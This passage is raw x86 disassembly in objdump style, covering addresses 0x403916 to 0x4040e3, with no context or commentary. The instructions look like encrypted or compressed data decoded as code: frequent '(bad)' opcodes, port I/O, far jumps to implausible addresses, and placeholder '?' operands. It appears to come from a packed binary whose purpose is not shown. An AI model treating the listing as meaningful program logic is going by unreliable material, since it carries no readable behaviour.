  403916:	pop    ebp
  403917:	ror    BYTE PTR [esi-0x4bc0de34],1
  40391d:	sbb    DWORD PTR [ebp-0x33aa303c],esi
  403923:	jns    0x4038db
  403925:	in     eax,0x9f
  403927:	jmp    0xcbfe105e
  40392c:	arpl   WORD PTR [ebx-0x2ce6cc6f],ax
  403932:	add    ah,BYTE PTR [ebx]
  403934:	loopne 0x40391e
  403936:	push   es
  403937:	inc    ecx
  403938:	adc    BYTE PTR [ebp+0x4e],dl
  40393b:	dec    eax
  40393c:	outs   dx,BYTE PTR ds:[esi]
  40393d:	push   0xffffffdd
  40393f:	mov    BYTE PTR [ebx+0x3f],0xe7
  403943:	je     0x403935
  403945:	sub    al,0xd5
  403947:	out    0x23,al
  403949:	push   0xbaaea7a6
  40394e:	jb     0x4039ce
  403950:	mov    dl,0xcb
  403952:	outs   dx,BYTE PTR ds:[esi]
  403953:	arpl   WORD PTR [eax],cx
  403955:	std    
  403956:	cmp    esp,DWORD PTR [eax]
  403958:	sbb    DWORD PTR [esi],0x59687190
  40395e:	jecxz  0x4039d3
  403960:	adc    BYTE PTR [ecx-0x9aacbd2],cl
  403966:	aas    
  403967:	sub    DWORD PTR [esi+0x42],edx
  40396a:	xlat   BYTE PTR ds:[ebx]
  40396b:	fwait
  40396c:	and    DWORD PTR [edi],ecx
  40396e:	push   edi
  40396f:	loope  0x4039b9
  403971:	xor    ah,cl
  403973:	sar    DWORD PTR [edi-0x7086e941],cl
  403979:	scas   eax,DWORD PTR es:[edi]
  40397a:	xchg   BYTE PTR [eax],ah
  40397c:	ins    BYTE PTR es:[edi],dx
  40397d:	add    cl,BYTE PTR [ebp+0x2dbb3a92]
  403983:	xchg   ebp,eax
  403984:	hlt    
  403985:	stc    
  403986:	int3   
  403987:	inc    ebp
  403988:	xchg   ecx,eax
  403989:	mov    ?,edi
  40398b:	add    DWORD PTR [ecx+0x35781c20],ebp
  403991:	iret   
  403992:	sub    ebp,eax
  403994:	ror    bh,0x8d
  403997:	push   edi
  403998:	rol    BYTE PTR [ebx+0x38],cl
  40399b:	aaa    
  40399c:	mov    ebp,0x5c3f0f8e
  4039a1:	add    DWORD PTR [ecx+ecx*4],esp
  4039a4:	fs icebp 
  4039a6:	cmp    al,0xef
  4039a8:	popa   
  4039a9:	adc    ch,bl
  4039ab:	in     eax,dx
  4039ac:	push   0xffffffe7
  4039ae:	pop    esp
  4039af:	mov    bl,0xf7
  4039b1:	mov    ds:0xbb88df64,eax
  4039b6:	js     0x403996
  4039b8:	inc    DWORD PTR [ebp-0x5]
  4039bb:	dec    eax
  4039bc:	out    dx,eax
  4039bd:	pusha  
  4039be:	add    ebp,DWORD PTR [eax+0x4b]
  4039c1:	mov    eax,ds:0xbc181069
  4039c6:	jecxz  0x403a3c
  4039c8:	xor    ah,dh
  4039ca:	loop   0x403a32
  4039cc:	pusha  
  4039cd:	add    DWORD PTR [ebp+ebx*4-0x2b],edx
  4039d1:	mov    ecx,0x4d1ead55
  4039d6:	mov    esp,0x51d48b68
  4039db:	imul   esp,DWORD PTR ds:0xcf410428,0x60576036
  4039e5:	cmp    al,ch
  4039e7:	lods   eax,DWORD PTR ds:[esi]
  4039e8:	leave  
  4039e9:	mul    BYTE PTR [edx]
  4039eb:	push   ebp
  4039ec:	ja     0x403a1e
  4039ee:	mov    edi,0x1e5cdee7
  4039f3:	imul   eax,DWORD PTR [ebp-0x1022ecdb],0xb43beda5
  4039fd:	popa   
  4039fe:	xchg   BYTE PTR [esi+eiz*4],dh
  403a01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a02:	inc    ecx
  403a03:	test   al,0x80
  403a05:	adc    eax,0x4a0b5ec
  403a0a:	cmp    DWORD PTR [edi],0x2ecaa7cb
  403a10:	mov    esp,0xd77c9ac2
  403a15:	ins    BYTE PTR es:[edi],dx
  403a16:	push   ebx
  403a17:	clc    
  403a18:	std    
  403a19:	fld    st(2)
  403a1b:	nop
  403a1c:	(bad)  
  403a1d:	scas   al,BYTE PTR es:[edi]
  403a1e:	inc    esp
  403a1f:	in     eax,0x10
  403a21:	mov    DWORD PTR ds:0x79ccf21e,ebp
  403a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a28:	push   esi
  403a29:	inc    esp
  403a2a:	aad    0x85
  403a2c:	lods   eax,DWORD PTR ds:[esi]
  403a2d:	dec    esp
  403a2e:	inc    esi
  403a2f:	repnz dec ebp
  403a31:	mov    WORD PTR [edi],cs
  403a33:	push   edi
  403a34:	sub    DWORD PTR [ebx],0xffffffb4
  403a37:	adc    DWORD PTR [ebx-0x12e9e92e],eax
  403a3d:	cli    
  403a3e:	jmp    0x22701bd7
  403a43:	rcl    BYTE PTR [eax+0x1bccd455],0xf1
  403a4a:	and    ebp,eax
  403a4c:	push   ecx
  403a4d:	mov    ecx,ss
  403a4f:	adc    eax,0xa1f92964
  403a54:	sub    BYTE PTR [eax+0x2],dl
  403a57:	jg     0x4039d9
  403a59:	out    0x8b,eax
  403a5b:	dec    esi
  403a5c:	call   0xdf55a503
  403a61:	cmp    ebx,ecx
  403a63:	push   0x16
  403a65:	imul   esp,eax,0x7ab6c1fb
  403a6b:	add    edi,DWORD PTR [ebx]
  403a6d:	add    DWORD PTR [edx-0x1f50db7b],0xd306f9b7
  403a77:	or     ebx,ebx
  403a79:	pop    eax
  403a7a:	clc    
  403a7b:	mov    cl,BYTE PTR [ecx-0x4c52c1d4]
  403a81:	mov    edx,0x59f31b11
  403a86:	pop    es
  403a87:	scas   al,BYTE PTR es:[edi]
  403a88:	push   edi
  403a89:	fidiv  DWORD PTR [edx]
  403a8b:	popf   
  403a8c:	test   DWORD PTR [ecx-0x6f265dca],edx
  403a92:	and    DWORD PTR [ecx+esi*8-0x63],edx
  403a96:	in     eax,dx
  403a97:	xchg   BYTE PTR [ebx+esi*2],cl
  403a9a:	std    
  403a9b:	stc    
  403a9c:	adc    DWORD PTR [ecx+0x2e],ebp
  403a9f:	inc    ebx
  403aa0:	addr16 mov ds:0x1209,al
  403aa4:	daa    
  403aa5:	sub    BYTE PTR [eax],ah
  403aa7:	sbb    BYTE PTR ds:0x56afc893,bl
  403aad:	sub    al,0xb4
  403aaf:	hlt    
  403ab0:	inc    ebx
  403ab1:	pusha  
  403ab2:	pop    es
  403ab3:	mov    al,0x35
  403ab5:	xchg   ecx,eax
  403ab6:	push   ss
  403ab7:	fcomp  QWORD PTR [ecx]
  403ab9:	sbb    ah,al
  403abb:	jl     0x403b01
  403abd:	pusha  
  403abe:	inc    edx
  403abf:	pop    ebx
  403ac0:	pop    esp
  403ac1:	mov    ecx,0xdf77312c
  403ac6:	push   eax
  403ac7:	das    
  403ac8:	jle    0x403b19
  403aca:	and    dh,cl
  403acc:	icebp  
  403acd:	nop
  403ace:	ret    0x7361
  403ad1:	or     BYTE PTR [edx-0x7f],0xb
  403ad5:	mov    ebp,0x25f3419c
  403ada:	pushf  
  403adb:	push   ss
  403adc:	and    al,0x27
  403ade:	mov    esi,0xb7d1ce2a
  403ae3:	(bad)  [ebx+esi*2+0x459b34d3]
  403aea:	xor    DWORD PTR [ebx],ebx
  403aec:	inc    edi
  403aed:	and    eax,0xa5c456d9
  403af2:	and    BYTE PTR [ebx+0x75546de9],ch
  403af8:	and    ecx,DWORD PTR [edx+0x34d770f3]
  403afe:	(bad)  
  403aff:	(bad)  
  403b00:	cwde   
  403b01:	iret   
  403b02:	call   0x1cca:0x80aaf552
  403b09:	xchg   DWORD PTR [ebx+0x7b0e058c],esi
  403b0f:	add    al,0x23
  403b11:	mov    BYTE PTR [ebp+0x2],0xe6
  403b15:	cmp    BYTE PTR [esi+esi*1],dl
  403b18:	fsub   QWORD PTR [eax-0x74]
  403b1b:	das    
  403b1c:	xor    dh,dh
  403b1e:	call   DWORD PTR [edx+0x12eddaef]
  403b24:	dec    edi
  403b25:	mov    ah,0x2a
  403b27:	dec    ecx
  403b28:	or     BYTE PTR [eax-0x324112d0],ah
  403b2e:	xchg   ebp,eax
  403b2f:	stc    
  403b30:	sbb    dl,dh
  403b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b33:	mov    BYTE PTR [ebx+0x268eb02d],dh
  403b39:	sar    BYTE PTR [ebx+eiz*2],0xb4
  403b3d:	outs   dx,BYTE PTR ds:[esi]
  403b3e:	jp     0x403ae3
  403b40:	or     DWORD PTR [esi+0x5d],edi
  403b43:	xor    eax,0x687132d
  403b48:	mov    edx,0xb69da4c7
  403b4d:	mov    ecx,DWORD PTR [eax-0x5277cc70]
  403b53:	inc    esi
  403b54:	sub    ebx,esi
  403b56:	and    dh,bh
  403b58:	inc    ecx
  403b59:	aam    0x1f
  403b5b:	arpl   cx,sp
  403b5d:	push   esp
  403b5e:	loopne 0x403bd0
  403b60:	out    dx,eax
  403b61:	push   0xcb0b7d65
  403b66:	repz push edx
  403b68:	mov    eax,eax
  403b6a:	test   DWORD PTR [edx+0x722f45b7],ebp
  403b70:	or     al,ah
  403b72:	mov    ebp,0xc64a39b8
  403b77:	and    eax,0xff844de3
  403b7c:	rcl    DWORD PTR [eax-0x6eaae8af],0xbe
  403b83:	stc    
  403b84:	cld    
  403b85:	pop    eax
  403b86:	sbb    DWORD PTR [ebx+0x544ba563],0xffffffa8
  403b8d:	test   BYTE PTR ds:0x441c3583,bl
  403b93:	outs   dx,BYTE PTR ds:[esi]
  403b94:	repz in al,dx
  403b96:	data16 add ch,0xfe
  403b9a:	xchg   ebx,eax
  403b9b:	push   cs
  403b9c:	cmp    bl,0x2d
  403b9f:	sub    al,0x9f
  403ba1:	cmp    DWORD PTR [eax-0x13259f41],0x34
  403ba8:	das    
  403ba9:	scas   al,BYTE PTR es:[edi]
  403baa:	sbb    DWORD PTR [eax],eax
  403bac:	lods   al,BYTE PTR ds:[esi]
  403bad:	dec    ebx
  403bae:	dec    edi
  403baf:	push   esp
  403bb0:	icebp  
  403bb1:	inc    ecx
  403bb2:	jecxz  0x403c2d
  403bb4:	mov    ds:0xefdf753,eax
  403bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bba:	cmp    eax,0x149bea85
  403bbf:	sbb    eax,0xc1497016
  403bc4:	ret    0xe227
  403bc7:	lahf   
  403bc8:	adc    DWORD PTR [ebp+0x5c43696a],0xf47d382e
  403bd2:	popf   
  403bd3:	mov    al,0x48
  403bd5:	inc    ebp
  403bd6:	push   ebp
  403bd7:	sub    edx,DWORD PTR [ebx-0x5b]
  403bda:	push   ss
  403bdb:	ror    DWORD PTR [edi+0x11602283],cl
  403be1:	aam    0x13
  403be3:	xchg   ebp,eax
  403be4:	scas   al,BYTE PTR es:[edi]
  403be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403be6:	repnz dec ebp
  403be8:	push   ebx
  403be9:	test   BYTE PTR [edx],0x27
  403bec:	fdivr  QWORD PTR [eax-0x1a]
  403bef:	mov    al,0xba
  403bf1:	pop    edx
  403bf2:	mov    bl,0x83
  403bf4:	dec    edx
  403bf5:	xor    eax,0x28adf1d4
  403bfa:	retf   
  403bfb:	cmp    ah,ah
  403bfd:	loope  0x403c04
  403bff:	sbb    DWORD PTR [esi+0x6fc71cd],0xffffff8f
  403c06:	xor    dh,BYTE PTR [edx-0x6f]
  403c09:	mov    edx,0x60f9f0b
  403c0e:	iret   
  403c0f:	lea    esp,[ecx]
  403c11:	nop
  403c12:	fnstcw WORD PTR [esi+0x46d54574]
  403c18:	add    edx,DWORD PTR [ebp+0x47]
  403c1b:	push   ecx
  403c1c:	mov    esi,0x63b705de
  403c21:	pushf  
  403c22:	clc    
  403c23:	or     eax,0xa97f21ca
  403c28:	aad    0x6c
  403c2a:	inc    edx
  403c2b:	loopne 0x403c46
  403c2d:	lea    esp,[edx+0x5593b380]
  403c33:	jg     0x403c96
  403c35:	mov    esi,0x4bcd22b1
  403c3a:	in     al,0x35
  403c3c:	sub    al,0xab
  403c3e:	xor    ch,ch
  403c40:	dec    ebp
  403c41:	fmul   QWORD PTR [edi]
  403c43:	icebp  
  403c44:	in     al,0x38
  403c46:	dec    esp
  403c47:	mov    ebx,0xa42a9cf1
  403c4c:	jns    0x403c3b
  403c4e:	int    0x6f
  403c50:	mov    ah,0x52
  403c52:	aas    
  403c53:	and    BYTE PTR [edx],al
  403c55:	adc    ah,al
  403c57:	hlt    
  403c58:	cmc    
  403c59:	or     DWORD PTR [ebp+0x59],edi
  403c5c:	mov    edi,0x63ecaf5e
  403c61:	int    0xe9
  403c63:	xlat   BYTE PTR ds:[ebx]
  403c64:	loopne 0x403cca
  403c66:	adc    eax,0xf412f625
  403c6b:	lock mov edi,0x22c3cab
  403c71:	push   ebx
  403c72:	xchg   edx,eax
  403c73:	add    eax,0x99fa6b80
  403c78:	shl    BYTE PTR [ebp+0x25d7cae0],cl
  403c7e:	push   es
  403c7f:	nop
  403c80:	sbb    esp,eax
  403c82:	cmp    BYTE PTR [edx+0x7a],bh
  403c85:	xchg   edi,eax
  403c86:	cld    
  403c87:	pop    esi
  403c88:	ds in  al,0xb1
  403c8b:	mov    ah,0x2c
  403c8d:	es jmp 0xb412:0x9bf93dc6
  403c95:	aam    0x5a
  403c97:	cdq    
  403c98:	fld    TBYTE PTR [eax]
  403c9a:	aam    0x9c
  403c9c:	es call 0x834e:0x200b6a9e
  403ca4:	aam    0x66
  403ca6:	inc    esi
  403ca7:	pop    esp
  403ca8:	xor    DWORD PTR [eax],eax
  403caa:	not    BYTE PTR [eax]
  403cac:	pop    es
  403cad:	popf   
  403cae:	cmp    eax,0x903c269
  403cb3:	pop    esi
  403cb4:	add    al,0xb7
  403cb6:	pop    es
  403cb7:	icebp  
  403cb8:	fmul   st,st(4)
  403cba:	push   ds
  403cbb:	popa   
  403cbc:	pop    ebx
  403cbd:	push   ebx
  403cbe:	out    dx,al
  403cbf:	shl    ch,1
  403cc1:	jmp    0x1a596daa
  403cc6:	aad    0x5a
  403cc8:	imul   eax,DWORD PTR [ecx+0x4d],0xffffffe2
  403ccc:	cdq    
  403ccd:	out    0x2d,al
  403ccf:	es imul edx,ebx,0xffff2ee7
  403cd6:	adc    eax,0x9f0b4f78
  403cdb:	jg     0x403c68
  403cdd:	sub    DWORD PTR [edi-0x4c92477c],edx
  403ce3:	jmp    0xe77d:0xbb8c5f5f
  403cea:	pop    ds
  403ceb:	jmp    0x5f03:0xc0a8f069
  403cf2:	(bad)  
  403cf3:	adc    ch,bl
  403cf5:	xchg   al,al
  403cf7:	popf   
  403cf8:	cmp    BYTE PTR [ebp-0x4b89fcff],0x74
  403cff:	push   edx
  403d00:	push   0xb
  403d02:	push   es
  403d03:	jns    0x403c92
  403d05:	icebp  
  403d06:	pop    eax
  403d07:	xchg   ebp,eax
  403d08:	fbld   TBYTE PTR [esi]
  403d0a:	or     DWORD PTR [eax-0x424e5724],esp
  403d10:	jl     0x403d8d
  403d12:	mov    bl,0xf7
  403d14:	ins    BYTE PTR es:[edi],dx
  403d15:	dec    esi
  403d16:	adc    al,0x4c
  403d18:	sub    esp,DWORD PTR [esi]
  403d1a:	dec    ebp
  403d1b:	(bad)  
  403d1d:	inc    ebx
  403d1e:	pop    esp
  403d1f:	dec    edx
  403d20:	jl     0x403caf
  403d22:	daa    
  403d23:	in     al,0x2e
  403d25:	shl    DWORD PTR [esi],0x1d
  403d28:	lods   al,BYTE PTR ds:[esi]
  403d29:	out    dx,al
  403d2a:	shl    BYTE PTR [edi-0x54],1
  403d2d:	jle    0x403da5
  403d2f:	ins    DWORD PTR es:[edi],dx
  403d30:	lock adc al,0x74
  403d33:	ins    DWORD PTR es:[edi],dx
  403d34:	fwait
  403d35:	and    bh,BYTE PTR [ecx-0x19]
  403d38:	sub    DWORD PTR [esi],0x6cfb476d
  403d3e:	cs and eax,0x71170f3f
  403d44:	div    BYTE PTR [esi]
  403d46:	cmp    DWORD PTR [ebx],edx
  403d48:	adc    eax,0xaffbd7be
  403d4d:	fcomip st,st(4)
  403d4f:	pop    ecx
  403d50:	fistp  QWORD PTR ds:0xb352bc6a
  403d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d57:	repnz shl BYTE PTR [esi],1
  403d5a:	jge    0x403da1
  403d5c:	inc    edx
  403d5d:	jmp    0x384ccef2
  403d62:	and    eax,DWORD PTR [ecx-0x2eea5133]
  403d68:	pop    esp
  403d69:	je     0x403dc9
  403d6b:	or     esp,DWORD PTR [ecx+eiz*2-0x3da2c6c0]
  403d72:	lea    eax,[edi+0x49]
  403d75:	mov    ch,BYTE PTR [ecx]
  403d77:	cmc    
  403d78:	pop    ds
  403d79:	iret   
  403d7a:	xchg   bl,bh
  403d7c:	outs   dx,BYTE PTR ds:[esi]
  403d7d:	aad    0xe5
  403d7f:	jmp    0x437fae0a
  403d84:	pop    ebp
  403d85:	aas    
  403d86:	(bad)  [edi-0x71]
  403d89:	in     al,dx
  403d8a:	cs aam 0x6d
  403d8d:	sub    al,0xf3
  403d8f:	adc    edx,ecx
  403d91:	sub    ch,BYTE PTR [ebx+esi*2-0x5eff1ee2]
  403d98:	(bad)  
  403d99:	fild   WORD PTR [esp+ecx*2]
  403d9c:	das    
  403d9d:	mov    eax,ds:0xcad02524
  403da2:	sbb    ebp,esi
  403da4:	ins    DWORD PTR es:[edi],dx
  403da5:	jnp    0x403d72
  403da7:	sbb    al,0x7b
  403da9:	inc    ebx
  403daa:	jnp    0x403e1e
  403dac:	xchg   edx,eax
  403dad:	or     ebx,esi
  403daf:	mov    bl,0x4c
  403db1:	ja     0x403db7
  403db3:	xchg   esp,eax
  403db4:	shl    BYTE PTR [ebx+edi*8+0x1bdcdf7c],cl
  403dbb:	add    dh,ch
  403dbd:	push   0x3d4a45d3
  403dc2:	lahf   
  403dc3:	mov    eax,0x49e79ae1
  403dc8:	iret   
  403dc9:	bound  esp,QWORD PTR [ebp+0x554c1ee0]
  403dcf:	(bad)  
  403dd0:	adc    BYTE PTR [ecx-0x24fbdce9],dh
  403dd6:	mov    eax,0x3bb4617a
  403ddb:	inc    eax
  403ddc:	xchg   bl,bl
  403dde:	xchg   ecx,eax
  403ddf:	cmp    ch,bl
  403de1:	movzx  esp,BYTE PTR [esi+0x2b]
  403de5:	cli    
  403de6:	or     eax,0xddfb8c3b
  403deb:	and    BYTE PTR [edi-0x33],0xff
  403def:	push   ebp
  403df0:	xchg   ecx,eax
  403df1:	sbb    DWORD PTR [eax-0x414bed06],esp
  403df7:	sbb    DWORD PTR [eax+esi*2+0x3c],ecx
  403dfb:	iret   
  403dfc:	and    ebx,ebx
  403dfe:	pop    ss
  403dff:	stc    
  403e00:	adc    eax,0xfc128656
  403e05:	fadd   DWORD PTR [ebp-0x5963e0b9]
  403e0b:	push   ds
  403e0c:	inc    eax
  403e0d:	mov    cl,0xa6
  403e0f:	and    DWORD PTR [edi-0x2a],edi
  403e12:	xchg   ebx,eax
  403e13:	xor    bl,BYTE PTR [ecx+eiz*2]
  403e16:	mov    gs,esi
  403e18:	add    dh,BYTE PTR [ebx-0x342fe58b]
  403e1e:	not    DWORD PTR [edi]
  403e20:	pop    ss
  403e21:	sbb    cl,cl
  403e23:	sub    al,0x37
  403e25:	out    dx,al
  403e26:	mov    edi,esi
  403e28:	xlat   BYTE PTR ds:[ebx]
  403e29:	xchg   esi,eax
  403e2a:	jp     0x403e83
  403e2c:	scas   eax,DWORD PTR es:[edi]
  403e2d:	jmp    0x403dbf
  403e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e30:	cmp    BYTE PTR [ecx],0x8
  403e33:	xchg   ecx,eax
  403e34:	cmc    
  403e35:	sub    esp,DWORD PTR [ebp+0x36cb4cd8]
  403e3b:	sbb    al,BYTE PTR [eax+0x1c67c811]
  403e41:	sub    bl,BYTE PTR [ebx-0x63]
  403e44:	aaa    
  403e45:	outs   dx,DWORD PTR ds:[esi]
  403e46:	mov    eax,DWORD PTR [eax]
  403e48:	les    ebp,FWORD PTR [ebp-0x1d1dacf7]
  403e4e:	outs   dx,DWORD PTR ds:[esi]
  403e4f:	mov    ebp,DWORD PTR [ebp+0x49]
  403e52:	mov    ebx,0xf096da87
  403e57:	scas   eax,DWORD PTR es:[edi]
  403e58:	dec    esi
  403e59:	or     dh,BYTE PTR [ebp-0x7c]
  403e5c:	add    dl,cl
  403e5e:	jno    0x403e71
  403e60:	or     bl,BYTE PTR [ecx+0x1dbd5935]
  403e66:	and    al,0x49
  403e68:	xor    esp,esi
  403e6a:	inc    esi
  403e6b:	out    dx,eax
  403e6c:	sysexit 
  403e6e:	bnd jne 0x403ec0
  403e71:	(bad)  
  403e72:	in     al,0x73
  403e74:	add    DWORD PTR [ebp-0x78],ebx
  403e77:	adc    bl,BYTE PTR [esi-0x26117c7e]
  403e7d:	adc    eax,0x18951b85
  403e82:	jb     0x403e5c
  403e84:	adc    ebp,DWORD PTR [ecx-0x792a9739]
  403e8a:	lea    ecx,[ebp+0x56676962]
  403e90:	fnstcw WORD PTR [edx+0x2389d6ac]
  403e96:	stos   BYTE PTR es:[edi],al
  403e97:	in     eax,0xa3
  403e99:	retf   0xabc3
  403e9c:	je     0x403e31
  403e9e:	iret   
  403e9f:	retf   0x47b
  403ea2:	popf   
  403ea3:	pop    edx
  403ea4:	sbb    al,0xa9
  403ea6:	in     al,dx
  403ea7:	scas   eax,DWORD PTR es:[edi]
  403ea8:	or     al,BYTE PTR [ebx+0x52d8eb2d]
  403eae:	sbb    BYTE PTR ds:0xd029efbc,ah
  403eb4:	int    0x49
  403eb6:	add    al,0x78
  403eb8:	iret   
  403eb9:	xor    BYTE PTR [edi+edx*8+0x1d93751d],ch
  403ec0:	icebp  
  403ec1:	mov    eax,0x149f1f2d
  403ec6:	aaa    
  403ec7:	neg    DWORD PTR [eax]
  403ec9:	retf   0x931f
  403ecc:	xchg   ebx,edx
  403ece:	retf   
  403ecf:	push   esi
  403ed0:	mov    ds:0xb682016a,al
  403ed5:	ins    BYTE PTR es:[edi],dx
  403ed6:	add    BYTE PTR [eax-0x1a7e6501],bl
  403edc:	sub    bh,cl
  403ede:	imul   edi,DWORD PTR [ebp-0x27],0x5372fc14
  403ee5:	dec    esp
  403ee6:	nop
  403ee7:	pop    ss
  403ee8:	cwde   
  403ee9:	(bad)  
  403eea:	bswap  esp
  403eec:	adc    al,0xda
  403eee:	sub    ebp,DWORD PTR [edx+0x43d2624b]
  403ef4:	jge    0x403ea4
  403ef6:	or     BYTE PTR [ebx+0x331b4226],dl
  403efc:	push   es
  403efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403efe:	xchg   esp,eax
  403eff:	xchg   esp,eax
  403f00:	xchg   esp,eax
  403f01:	out    0xc1,al
  403f03:	lahf   
  403f04:	add    DWORD PTR [edi],ecx
  403f06:	xchg   ecx,eax
  403f07:	sbb    ebx,DWORD PTR [ebx+ecx*4-0x70]
  403f0b:	in     al,dx
  403f0c:	sbb    al,0x3c
  403f0e:	(bad)  
  403f0f:	iret   
  403f10:	test   al,0x6d
  403f12:	jmp    0x403ef2
  403f14:	lods   al,BYTE PTR ds:[esi]
  403f15:	mov    al,0x25
  403f17:	or     bl,BYTE PTR [ecx-0x76]
  403f1a:	aam    0x95
  403f1c:	imul   edx,ebx,0xffffff96
  403f1f:	rol    DWORD PTR ds:0x95166192,0x39
  403f26:	(bad)  
  403f27:	loop   0x403f4d
  403f29:	dec    esi
  403f2a:	xor    BYTE PTR [edx-0x72],cl
  403f2d:	and    al,0xbc
  403f2f:	add    eax,0xc71d1319
  403f34:	mov    ah,0x28
  403f36:	ins    BYTE PTR es:[edi],dx
  403f37:	ds add al,ah
  403f3a:	cs mov bh,0x4d
  403f3d:	push   cs
  403f3e:	xchg   edx,eax
  403f3f:	rcl    eax,cl
  403f41:	(bad)  
  403f42:	and    BYTE PTR [eax],0x15
  403f45:	retf   0xb888
  403f48:	pushf  
  403f49:	jg     0x403f1a
  403f4b:	jno    0x403f76
  403f4d:	xor    DWORD PTR ds:[eax-0x5dd19909],edi
  403f54:	adc    ch,bh
  403f56:	pushf  
  403f57:	jae    0x403fb9
  403f59:	adc    eax,0x68d10eba
  403f5e:	mov    eax,0xcbd68108
  403f63:	adc    DWORD PTR [esi+0x3f1b4c74],esi
  403f69:	dec    ecx
  403f6a:	in     al,dx
  403f6b:	stos   BYTE PTR es:[edi],al
  403f6c:	or     eax,0xbc632659
  403f71:	gs retf 0x9e85
  403f75:	das    
  403f76:	dec    ebx
  403f77:	xor    al,0xe7
  403f79:	test   BYTE PTR [esi-0x56],bh
  403f7c:	dec    ecx
  403f7d:	pop    eax
  403f7e:	sub    DWORD PTR [esi],edx
  403f80:	or     ebx,edx
  403f82:	cmp    al,BYTE PTR [edx+ecx*1+0x18]
  403f86:	addr16 jp 0x403f7f
  403f89:	xor    DWORD PTR [eax+0x55],ebx
  403f8c:	mov    eax,ds:0xccb851b3
  403f91:	lds    eax,FWORD PTR [edx-0xe]
  403f94:	cmp    esi,esi
  403f96:	or     esi,ebp
  403f98:	loope  0x403f48
  403f9a:	xor    edx,DWORD PTR [esi-0x6988ec90]
  403fa0:	aas    
  403fa1:	dec    eax
  403fa2:	xor    ebp,ebx
  403fa4:	imul   eax,DWORD PTR [ecx-0xb92cc08],0xf3e22865
  403fae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403faf:	or     DWORD PTR [bp+si+0x5d],ecx
  403fb3:	jecxz  0x403ff3
  403fb5:	fs jbe 0x403fd4
  403fb8:	jns    0x403f97
  403fba:	test   eax,ecx
  403fbc:	mov    dl,0xe0
  403fbe:	(bad)  
  403fbf:	out    0x35,eax
  403fc1:	nop
  403fc2:	and    ch,cl
  403fc4:	pop    eax
  403fc5:	cmp    al,0x14
  403fc7:	inc    ebx
  403fc8:	add    BYTE PTR [ebp-0x5a194ea2],al
  403fce:	pcmpgtb mm7,mm7
  403fd1:	rcr    BYTE PTR [eax-0x721cda52],1
  403fd7:	inc    esi
  403fd8:	mov    fs:0x2f757e18,al
  403fde:	sbb    BYTE PTR [edx-0x9],0x2d
  403fe2:	mov    ch,0x73
  403fe4:	jmp    0x36e97145
  403fe9:	cmp    ecx,esi
  403feb:	es in  eax,dx
  403fed:	jns    0x403f99
  403fef:	pop    esi
  403ff0:	out    dx,al
  403ff1:	cmp    ecx,DWORD PTR [ebx+eiz*4-0x4a9463ae]
  403ff8:	aam    0x19
  403ffa:	es push ecx
  403ffc:	mov    edx,0xec152e55
  404001:	cli    
  404002:	or     BYTE PTR [ebp-0x3d6f7d65],dl
  404008:	mov    eax,0x7d0b2412
  40400d:	push   0x8d8d4c5a
  404012:	into   
  404013:	(bad)  
  404014:	jnp    0x404049
  404016:	xor    dh,bh
  404018:	mov    WORD PTR [edi],?
  40401a:	repz mov edx,0x8c3cecd5
  404020:	xor    edi,DWORD PTR [esi+0x2a]
  404023:	add    eax,0xed0ca867
  404028:	xlat   BYTE PTR ds:[ebx]
  404029:	adc    dh,BYTE PTR [edi+edx*8+0x1dbca45e]
  404030:	in     eax,dx
  404031:	enter  0xa04d,0x3d
  404035:	mov    ch,BYTE PTR [ebp+0x6710e4b0]
  40403b:	mov    ebp,0x6b81192e
  404040:	mov    eax,ds:0xd894b336
  404045:	retf   
  404046:	in     eax,0xd
  404048:	mov    al,ds:0x8c477190
  40404d:	jo     0x404008
  40404f:	retf   0xe2b2
  404052:	lods   eax,DWORD PTR ds:[esi]
  404053:	mov    ebx,0xafb4dc6e
  404058:	xchg   esi,eax
  404059:	sbb    eax,esi
  40405b:	(bad)  
  40405c:	xlat   BYTE PTR ds:[ebx]
  40405d:	fs xchg edx,eax
  40405f:	or     esi,DWORD PTR [ebx]
  404061:	in     al,dx
  404062:	out    dx,al
  404063:	jae    0x4040b3
  404065:	hlt    
  404066:	sub    eax,0x4fd4933f
  40406b:	das    
  40406c:	mov    dh,0x56
  40406e:	or     eax,0xb4a5c11f
  404073:	sub    dl,BYTE PTR [esp+esi*2+0x66bdb841]
  40407a:	arpl   WORD PTR [ebp+0x9],di
  40407d:	push   ebx
  40407e:	mov    eax,0xfb7bad28
  404083:	(bad)  
  404084:	repz enter 0x7781,0xa1
  404089:	dec    edi
  40408a:	xor    DWORD PTR [eax+0x63],eax
  40408d:	and    al,BYTE PTR [ebp+0x2a]
  404090:	xchg   esi,eax
  404091:	pusha  
  404092:	call   0xcc07bcfe
  404097:	or     al,0x7a
  404099:	lods   eax,DWORD PTR ds:[esi]
  40409a:	repz daa 
  40409c:	mov    ch,0xae
  40409e:	mov    ch,ch
  4040a0:	xchg   DWORD PTR [edx-0x75],esp
  4040a3:	popa   
  4040a4:	aad    0x7
  4040a6:	inc    BYTE PTR [ebp+0x6]
  4040a9:	jmp    0x5626:0xeb209f10
  4040b0:	and    eax,0x5b7174bd
  4040b5:	or     BYTE PTR [eax+ebx*1],bl
  4040b8:	and    al,BYTE PTR [edx-0x6650e714]
  4040be:	out    dx,al
  4040bf:	jl     0x40407d
  4040c1:	aam    0x6
  4040c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c4:	ins    BYTE PTR es:[edi],dx
  4040c5:	in     eax,0x5f
  4040c7:	mov    ah,0x36
  4040c9:	add    esi,DWORD PTR [esi+0x1d]
  4040cc:	adc    al,0xd4
  4040ce:	rol    edx,1
  4040d0:	nop
  4040d1:	(bad)  
  4040d2:	imul   ecx,eax,0x6c446e6c
  4040d8:	jg     0x4040d4
  4040da:	outs   dx,DWORD PTR ds:[esi]
  4040db:	jbe    0x40411c
  4040dd:	inc    eax
  4040de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040df:	mov    es,WORD PTR [edx]
  4040e1:	mov    ch,0x8f
  4040e3:	in     al,0x8a
